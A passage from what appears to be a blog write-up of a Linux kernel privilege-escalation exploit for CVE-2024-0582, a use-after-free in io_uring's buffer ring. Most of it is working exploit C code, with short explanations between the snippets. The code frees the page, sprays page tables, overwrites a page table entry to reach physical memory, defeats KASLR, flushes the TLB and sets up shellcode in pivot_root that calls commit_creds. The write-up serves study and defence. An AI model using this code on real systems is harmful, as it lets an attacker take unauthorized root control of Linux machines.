   <span class="cm">/* Bind process to current CPU core */</span>
   <span class="n">set_cpu_affinity</span><span class="p">();</span>
 
   <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Initializing io_uring...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
   <span class="kt">int</span> <span class="n">uring_fd</span> <span class="o">=</span> <span class="n">io_uring_setup</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">params</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">uring_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">perror</span><span class="p">(</span><span class="s">"io_uring_setup"</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
   <span class="p">}</span>
 
   <span class="cm">/* Prepare pages (PTE not allocated at this moment) */</span>
   <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_PAGESPRAY</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="mh">0x200000</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mh">0x10000UL</span><span class="p">),</span>
                  <span class="mh">0x8000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span>
                  <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">perror</span><span class="p">(</span><span class="s">"mmap failed"</span><span class="p">);</span>
         <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
      <span class="p">}</span>
   <span class="p">}</span>
 
   <span class="n">printf</span><span class="p">(</span><span class="s">"[*] io_uring instance created (fd: %d).</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">);</span>
   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
   
   <span class="cm">/* Register a buffer ring with io_uring */</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Registering buffer ring with io_uring...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
   <span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_register</span><span class="p">(</span><span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_REGISTER_PBUF_RING</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reg</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">perror</span><span class="p">(</span><span class="s">"io_uring_register (PBUF_RING) failed"</span><span class="p">);</span>
      <span class="n">close</span><span class="p">(</span><span class="n">uring_fd</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
   <span class="p">}</span>
 
   <span class="cm">/* Map the buffer ring with mmap */</span>
   <span class="n">pbuf_mapping</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_OFF_PBUF_RING</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="n">pbuf_mapping</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">perror</span><span class="p">(</span><span class="s">"mmap for buffer ring failed"</span><span class="p">);</span>
      <span class="n">close</span><span class="p">(</span><span class="n">uring_fd</span><span class="p">);</span>
      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Buffer ring address: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pbuf_mapping</span><span class="p">);</span>
   <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="p">...</span>
</pre></table></code></div></div><p>Then, the exploit triggers the vulnerability by unregistering the buffer ring, which frees the page and returns it to the buddy allocator.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">printf</span><span class="p">(</span><span class="s">"[*] Unregistering buffer ring...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">io_uring_register</span><span class="p">(</span><span class="n">uring_fd</span><span class="p">,</span> <span class="n">IORING_UNREGISTER_PBUF_RING</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">unreg</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">perror</span><span class="p">(</span><span class="s">"io_uring_unregister (PBUF_RING) failed"</span><span class="p">);</span>
    <span class="n">munmap</span><span class="p">(</span><span class="n">pbuf_mapping</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">uring_fd</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>At that point, the exploit needs to write data to the previously allocated pages in order to spray page tables. Albeit it reserved the pages beforehand using <code class="language-plaintext highlighter-rouge">mmap</code>, the page tables are allocated when those pages are written to.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="cm">/* Spray page table entries (PTEs) by writing to mapped pages */</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Spraying page tables...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_PAGESPRAY</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
       <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">=</span> <span class="sc">'a'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The following figure illustrates the memory layout after a successful heap spray.</p><p><img data-proofer-ignore data-src="../../assets/img/cve-2024-0582/heap_spray.png" alt="Figure 1" /></p><p>When the exploit reads memory through a dangling pointer referencing the vulnerable page, it confirms that multiple distinct <strong>Page Table Entries (PTEs)</strong> have been created. It then selects the <em>PTE</em> located at the 8th index, corresponding to an offset of <code class="language-plaintext highlighter-rouge">0x38</code>, to overwrite.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cm">/* Inspect the PTEs in the mapped buffer */</span>
<span class="kt">uint64_t</span> <span class="o">*</span><span class="n">page_table_entry</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">pbuf_mapping</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="mh">0x40</span><span class="p">;</span> <span class="n">offset</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">))</span> <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">value</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">pbuf_mapping</span> <span class="o">+</span> <span class="n">offset</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] PTE (%p): 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
         <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">pbuf_mapping</span> <span class="o">+</span> <span class="n">offset</span><span class="p">),</span>
         <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfffULL</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">));</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>These PTEs refer to one of the pages sprayed earlier, with each PTE covering a 0x1000-sized memory region. By patching the entry at offset <code class="language-plaintext highlighter-rouge">0x38</code>, the exploit gains control over the address range from <code class="language-plaintext highlighter-rouge">pbuf_mapping + 0x7000</code> to <code class="language-plaintext highlighter-rouge">pbuf_mapping + 0x8000</code>.</p><p><img data-proofer-ignore data-src="../../assets/img/cve-2024-0582/pte.png" alt="Figure 2" /></p><p>By replacing the PTEs’ physical addresses with kernel physical addresses, the exploit effectively gains the ability to write to targeted kernel memory locations via userspace pages. However, most physical addresses are randomized when <strong>Kernel Address Space Layout Randomization (KASLR)</strong> is enabled; therefore, <strong>KASLR</strong> must first be bypassed.</p><p><img data-proofer-ignore data-src="../../assets/img/cve-2024-0582/pte_diagram.png" alt="Figure 3" /></p><p>At this stage, the exploit can’t directly overwrite a PTE with the address of a kernel function because it does not yet know the kernel’s physical base address. Instead, the exploit overwrites the PTE with a fixed physical value that will lead to a kernel pointer leak—thereby bypassing <strong>KASLR</strong>. For instance, the value <code class="language-plaintext highlighter-rouge">0x800000000009c067</code>, which I found from <a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606">this blog post</a> created by <a href="https://github.com/ptr-yudai">@ptr-yudai</a>.</p><p>While reading that blog post, I also discovered a useful tool worth mentioning: <a href="https://github.com/bata24/gef">a customized version of GEF</a> by <a href="https://github.com/bata24/">@bata24</a>, which allows traversing physical memory addresses directly in GDB.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="cm">/* Modify the PTE to leak the corresponding kernel physical address */</span>
<span class="o">*</span><span class="n">page_table_entry</span> <span class="o">=</span> <span class="mh">0x800000000009c067</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Updated PTE value: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">page_table_entry</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Searching for overlapping page...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</pre></table></code></div></div><p>As a result of this PTE modification, one of the sprayed pages will now overlap with another page that contains a physical address we intend to leak. To find which page was affected, the exploit checks the bytes on each sprayed page (which were originally set to <code class="language-plaintext highlighter-rouge">'a'</code>). If any page no longer contains the expected values, it means that the page’s mapping has changed. That page is identified as the overlapping page containing the leaked address.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_PAGESPRAY</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">!=</span> <span class="sc">'a'</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">overlap_page</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">page_spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">;</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Overlapping page found: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">overlap_page</span><span class="p">);</span>
         <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
         <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="n">overlap_page</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Overlapping page not found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>After identifying the overlapping page, the exploit proceeds to calculate the kernel’s physical base address by subtracting a predefined dummy offset, which may vary by kernel version. Once the base address is computed, it checks whether the result is greater than <code class="language-plaintext highlighter-rouge">KERNEL_PHYSICAL_BASE_ADDR</code> (typically <code class="language-plaintext highlighter-rouge">0x1000000</code>) to determine whether <strong>KASLR</strong> is enabled on the target system. If the calculated physical address is less than <code class="language-plaintext highlighter-rouge">0x1000000</code>, it indicates that <strong>KASLR</strong> is disabled and the kernel’s physical base address is statically set to <code class="language-plaintext highlighter-rouge">0x1000000</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="cm">/* Calculate kernel physical base. */</span>
<span class="kt">size_t</span> <span class="n">kernel_phys_base</span> <span class="o">=</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">overlap_page</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfffULL</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2604000</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">kernel_phys_base</span> <span class="o">&lt;</span> <span class="n">KERNEL_PHYSICAL_BASE_ADDR</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] KASLR is not enabled on the target system!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">kernel_phys_base</span> <span class="o">=</span> <span class="n">KERNEL_PHYSICAL_BASE_ADDR</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Kernel physical base address: 0x%016lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernel_phys_base</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</pre></table></code></div></div><p>The calculated physical base address corresponds to the <code class="language-plaintext highlighter-rouge">_text</code> symbol in the kernel. By adding an appropriate offset to this base address, the exploit can redirect the overlapping page to a desired kernel address.</p><p>The offsets of functions and structures remain consistent across both virtual and physical address spaces; hence, to determine these offsets, we can subtract the virtual or physical base address from the corresponding target virtual or physical address. The resulting offset is then added to the physical base address to compute the correct physical address. This calculated physical address is subsequently used to overwrite the PTE, allowing the userspace-controlled page to directly point to the targeted kernel memory region.</p><p>Additionally, a useful GDB command—<code class="language-plaintext highlighter-rouge">monitor gva2gpa</code>—can translate a given virtual address into its corresponding physical address, simplifying this address resolution process during debugging.</p><p><img data-proofer-ignore data-src="../../assets/img/cve-2024-0582/init_task_offset.png" alt="Figure 4" /></p><p>Next, to correctly patch the shellcode with valid kernel virtual addresses, the exploit must leak a kernel pointer and use it to calculate the correct kernel’s virtual base address. To achieve this, it overwrites the <em>PTE</em> of its overlapping page with the physical address of the <code class="language-plaintext highlighter-rouge">init_task</code> structure. This causes a kernel address (from the <code class="language-plaintext highlighter-rouge">init_task</code> structure) to be mapped into user-space, leaking a kernel virtual address. It then calculates the virtual base address of the kernel—typically corresponding to the <code class="language-plaintext highlighter-rouge">_text</code> symbol—by subtracting a predefined dummy offset from the leaked address.</p><p>There’s one important detail to be cautious about. On my system, with <strong>KASLR</strong> enabled, the physical address of the <code class="language-plaintext highlighter-rouge">init_task_struct</code> was around <code class="language-plaintext highlighter-rouge">0xb480c900</code>. However, because only the lower 4 bytes of this address could be written into the PTE, the value actually set was <code class="language-plaintext highlighter-rouge">0x80000000b480c067</code>. This maps to an address <code class="language-plaintext highlighter-rouge">0x900</code> bytes before the <code class="language-plaintext highlighter-rouge">init_task_struct</code>.</p><p>In my case, this misalignment was not an issue (since the leaked pointer was still valid). Nonetheless, if you want to eliminate the discrepancy, you can simply add <code class="language-plaintext highlighter-rouge">0x900</code> to your overlapped userspace page pointer to ensure proper alignment with the actual location of <code class="language-plaintext highlighter-rouge">init_task_struct</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="cm">/* Patch the PTE to point to the initial task struct and leak its address to calculate the kernel's virtual base */</span>
<span class="kt">uint64_t</span> <span class="n">phys_func</span> <span class="o">=</span> <span class="n">kernel_phys_base</span> <span class="o">+</span> <span class="n">INIT_TASK_STRUCT</span><span class="p">;</span>
<span class="o">*</span><span class="n">page_table_entry</span> <span class="o">=</span> <span class="p">(</span><span class="n">phys_func</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfffULL</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x8000000000000067ULL</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Updated PTE value: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">page_table_entry</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="n">flush_tlb_and_print</span><span class="p">(</span><span class="n">overlap_page</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Leaked kernel pointer from the kernel mapping of the initial task struct: 0x%016zx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">overlap_page</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="kt">uint64_t</span> <span class="n">kernel_virtual_addr_base</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">overlap_page</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1a0c000</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Kernel virtual base address: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kernel_virtual_addr_base</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</pre></table></code></div></div><p>There’s a particularly important detail in this part of the code: the <code class="language-plaintext highlighter-rouge">flush_tlb_and_print()</code> function, which the exploit uses to flush the TLB after overwriting the PTE.</p><p>In modern CPU architectures, the <strong>Translation Lookaside Buffer (TLB)</strong> is a cache that speeds up the translation of virtual addresses to physical addresses by storing recently used PTEs. Therefore, after modifying a PTE, the CPU may still reference the old, cached translation. To ensure the new PTE mapping takes effect, the TLB must be forcibly flushed. This is essential to access the memory region corresponding to the updated PTE.</p><p>In the exploit, this TLB flushing is performed using the <code class="language-plaintext highlighter-rouge">mprotect()</code> system call. First, the memory permissions for the corrupted page are changed to <em>read-only</em>. Meanwhile, the TLB was forced to flush its cached entry for that page. Then, the original permissions are restored to <em>read-and-write</em>, ensuring that the memory can be accessed as intended after the flush.</p><p>If you want to dive deeper into the TLB flushing, you may find <a href="https://download.vusec.net/papers/revanc_ir-cs-77.pdf">this impressive paper</a> particularly insightful.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="cm">/* Flushes the TLB by temporarily changing memory permissions */</span>
<span class="kt">void</span> <span class="nf">flush_tlb_and_print</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">addresses</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mprotect</span><span class="p">(</span><span class="n">addresses</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mprotect (set PROT_READ)"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="cm">/* Restore original permissions */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">mprotect</span><span class="p">(</span><span class="n">addresses</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mprotect (restore PROT_READ | PROT_WRITE)"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] TLB flushed by changing memory permissions.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Since we have identified both the physical and virtual base addresses of the kernel and understand the structure of PTEs, we can now write the shellcode into the <code class="language-plaintext highlighter-rouge">pivot_root()</code> syscall using the following code.</p><p>Be sure to account for the offset issue mentioned earlier, as it is crucial when the exploit patches the PTE with the physical address of the <code class="language-plaintext highlighter-rouge">pivot_root()</code> syscall.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="cm">/* Patch the PTE to point to the kernel address of the pivot_root syscall */</span>
<span class="n">phys_func</span> <span class="o">=</span> <span class="n">kernel_phys_base</span> <span class="o">+</span> <span class="n">PIVOT_ROOT_OFFSET</span><span class="p">;</span>
<span class="o">*</span><span class="n">page_table_entry</span> <span class="o">=</span> <span class="p">(</span><span class="n">phys_func</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfffULL</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x8000000000000067ULL</span><span class="p">;</span>
<span class="n">flush_tlb_and_print</span><span class="p">(</span><span class="n">overlap_page</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Leaked kernel pointer from the kernel mapping of the pivot_root syscall: 0x%016zx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">overlap_page</span><span class="p">);</span>
<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</pre></table></code></div></div><p>Before writing our shellcode to the address space of the <code class="language-plaintext highlighter-rouge">pivot_root()</code> syscall, we first need to patch it with the correct kernel function addresses. To achieve this, we calculate the virtual addresses of <code class="language-plaintext highlighter-rouge">init_task_struct</code>, <code class="language-plaintext highlighter-rouge">prepare_kernel_cred()</code>, and <code class="language-plaintext highlighter-rouge">commit_creds()</code> by adding their known offsets to the leaked virtual base address of the kernel. If you need help finding the offset values of these elements, you can refer to <a href="https://github.com/kuzeyardabulut/CVE-2024-0582/tree/main/dirty_page_table#determining-the-correct-offset-values">this GitHub page</a>.</p><p>Despite the fact that these are 64-bit addresses, the exploit only embeds the lower 4 bytes. This is because the shellcode is crafted without the <strong>0xffffffff</strong> prefix, which represents the upper 32 bits of a full 64-bit address.</p><p>Besides, the exploit stores these values as <code class="language-plaintext highlighter-rouge">uint32_t</code> to simplify the patching process and avoid introducing null bytes, which could interfere with shellcode execution. Otherwise, including full 64-bit addresses directly might result in unexpected behavior or crashes.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span text-data=" C "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
